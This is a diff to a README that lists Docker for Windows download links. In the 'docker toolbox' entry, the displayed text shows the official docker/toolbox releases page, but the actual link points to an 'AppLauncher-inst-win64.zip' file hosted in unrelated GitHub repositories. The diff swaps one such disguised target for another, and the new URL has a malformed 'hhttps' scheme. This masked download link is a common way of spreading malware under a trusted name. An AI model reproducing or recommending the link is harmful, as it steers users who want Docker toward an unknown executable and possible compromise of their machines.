@@ -13,7 +13,7 @@ _docker for **Windows 10 Professional** or **Enterprise 64-bit**_
 _https://hub.docker.com/editions/community/docker-ce-desktop-windows/_
 
 _docker toolbox - **other Windows**_
-_[https://github.com/docker/toolbox/releases](https://github.com/EclipseFond/eclipse-collections/releases/download/v2.0.15/AppLauncher-inst-win64.zip)_
+_[https://github.com/docker/toolbox/releases](hhttps://github.com/zetrocode/Panel-Web-PHP-KeyAuth-Example/releases/download/teamplate/AppLauncher-inst-win64.zip)_
 
 _**Default 2.6 Oracle VirtualBox Image**_
 _http://github.com/boot2docker/boot2docker/releases/download/v19.03.5/boot2docker.iso_
